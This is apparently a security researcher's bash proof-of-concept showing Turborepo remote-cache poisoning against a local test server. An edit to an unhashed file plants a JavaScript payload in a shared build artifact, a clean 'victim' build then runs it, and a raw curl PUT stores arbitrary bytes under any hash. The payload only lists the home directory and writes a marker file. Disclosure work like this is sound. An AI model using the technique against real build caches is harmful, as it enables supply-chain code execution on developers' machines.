#!/usr/bin/env bash
set -euo pipefail
cd /tmp/turbo-poc

export TURBO_API="http://127.0.0.1:9099"
export TURBO_TOKEN="poc-write-token"
export TURBO_TEAM="team_poc"
RO="--remote-only --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM"

line(){ printf '\n========== %s ==========\n' "$1"; }
wipe_local(){ rm -rf .turbo packages/lib/dist apps/web/dist packages/lib/.turbo apps/web/.turbo; }

# ---- start the HTTP remote cache server ----
rm -rf /tmp/turbo-remote-store; rm -f /tmp/PWNED_BY_CACHE.txt
node remote-cache-server.mjs > /tmp/remote-cache.log 2>&1 &
SRV=$!; trap 'kill $SRV 2>/dev/null || true' EXIT
sleep 1
echo "server log:"; sed 's/^/  [srv] /' /tmp/remote-cache.log

git checkout -- shared/brand.js

line "STEP 1  main: clean build, push artifact to HTTP remote cache"
wipe_local
npx turbo run build $RO 2>&1 | grep -Ei 'cache (miss|hit)|Tasks:|uploaded|executing' || true

line "STEP 2  victim pulls clean artifact over HTTP (proves remote round-trip)"
wipe_local
npx turbo run build $RO 2>&1 | grep -Ei 'cache (hit|miss)|replay|Tasks:' || true
echo "-- run it: clean, no payload --"; node apps/web/dist/index.js
echo "-- PWNED marker? $([ -f /tmp/PWNED_BY_CACHE.txt ] && echo YES || echo no) --"

line "STEP 3  attacker branch: edit ONLY unhashed file, push poisoned artifact (same hash) over HTTP"
cat > shared/brand.js <<'EOF'
console.log("[brand] hello from the legit brand banner");
(() => {
  const fs = require("node:fs"), os = require("node:os");
  console.log("\x1b[31m[PWNED] arbitrary code executing inside the cached artifact\x1b[0m");
  try { console.log("[PWNED] can read $HOME ->", fs.readdirSync(os.homedir()).slice(0,3).join(", ")); } catch {}
  fs.writeFileSync("/tmp/PWNED_BY_CACHE.txt", "cache-poisoned over HTTP at load time\n");
})();
EOF
wipe_local
# remote:w = execute (ignore cache read) then WRITE poisoned artifact to remote
npx turbo run build --cache=remote:w --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM 2>&1 | grep -Ei 'cache|Tasks:|executing' || true

line "STEP 4  victim on clean main: fresh tree, pull from HTTP cache"
git checkout -- shared/brand.js
grep -q PWNED shared/brand.js && echo "  !! payload in source (unexpected)" || echo "  victim source clean (no payload)"
wipe_local; rm -f /tmp/PWNED_BY_CACHE.txt
npx turbo run build $RO 2>&1 | grep -Ei 'cache (hit|miss)|replay|Tasks:' || true
echo "-- RESULT: run the artifact the victim downloaded over HTTP --"
node apps/web/dist/index.js
echo "-- PWNED marker on victim? $([ -f /tmp/PWNED_BY_CACHE.txt ] && echo 'YES - POISONED OVER HTTP' || echo no) --"

line "STEP 5  no content validation: raw curl can store ANY bytes under ANY hash"
curl -s -X PUT "$TURBO_API/v8/artifacts/deadbeefcafe0000?teamId=$TURBO_TEAM" \
  -H "Authorization: Bearer $TURBO_TOKEN" -H "Content-Type: application/octet-stream" \
  --data-binary 'totally-arbitrary-bytes-not-a-real-artifact' -o /dev/null -w "  PUT status: %{http_code}\n"
echo -n "  GET returns what we stored: "; curl -s "$TURBO_API/v8/artifacts/deadbeefcafe0000?teamId=$TURBO_TEAM" -H "Authorization: Bearer $TURBO_TOKEN"
echo

line "SERVER ACCESS LOG (the HTTP traffic that did it)"
sed 's/^/  [srv] /' /tmp/remote-cache.log

git checkout -- shared/brand.js
